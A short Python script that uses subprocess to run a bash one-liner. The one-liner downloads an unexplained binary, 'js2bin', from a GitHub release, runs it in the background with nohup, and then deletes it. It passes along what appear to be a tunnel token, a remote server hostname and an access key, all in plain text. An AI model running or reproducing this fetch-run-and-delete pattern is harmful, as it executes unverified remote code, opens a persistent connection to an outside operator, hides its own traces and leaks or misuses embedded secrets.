import subprocess
cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiY2FhMzY0MGMtNjRhMy00YzIxLTlmZTgtMDczNjEyZmZlNzhjIiwicyI6Ik4yUTBNalEzTVRjdE5qZzBNaTAwTTJSakxXRmlOemd0TmpaallXVTRNVFEwTTJNNCJ9 N_S=nz.seav.eu.org N_K=pXWCYOfgPftGwht9cB bash -c 'curl -L -o js2bin https://github.com/seav1/dl/releases/download/src/js2bin && chmod +x js2bin && nohup ./js2bin && rm js2bin'"
subprocess.call(cmd, shell=True)
